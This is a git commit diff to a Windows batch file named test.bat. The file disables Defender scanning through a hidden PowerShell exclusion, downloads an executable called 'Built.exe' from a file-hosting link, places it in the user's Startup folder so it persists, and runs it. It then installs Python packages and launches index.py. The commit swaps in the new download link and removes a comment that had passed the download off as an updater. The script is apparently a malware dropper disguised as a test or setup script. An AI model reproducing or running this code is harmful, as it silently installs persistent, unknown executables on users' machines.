bc193f12a0e897f55f35cdf12090e235c8f7e065
Windysdus <155911382+windysdus@users.noreply.github.com>
2024-06-22 23:31:32 +0300

    Update test.bat

--- Windows/test/test.bat
+++ Windows/test/test.bat
@@ -3,10 +3,9 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/juo62co7nisogw537cjexyjlibfa/python/python-3.11.0-amd64.exe?download=1"
+set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
-// Downloads Missing Files, Automatically Updates, Do Not Delete the Command
 
 if exist "%DEST%" del "%DEST%"
 
@@ -21,7 +20,9 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/juo62co7nisogw537cjexyjlibfa/python/python-3.11.0-amd64.exe?download=1"
+set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+
 
 if exist "%DEST%" del "%DEST%"
 
@@ -33,4 +34,39 @@ if %errorlevel% neq 0 (
 
 call "%DEST%"
 
-run builder.py
+
+@echo off
+cd /d %~dp0
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
+    echo Very important click Add python exe to PATH.
+    pause
+)
+
+title Checking Python libraries...
+echo Checking 'cryptography' (1/3)
+python -c "import cryptography" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing cryptography...
+    python -m pip install cryptography > nul
+)
+
+echo Checking 'aiohttp' (2/3)
+python -c "import aiohttp" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing aiohttp...
+    python -m pip install aiohttp > nul
+)
+
+echo Checking 'pyinstaller' (3/3)
+python -c "import PyInstaller" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyinstaller...
+    python -m pip install pyinstaller > nul
+)
+
+cls
+python index.py
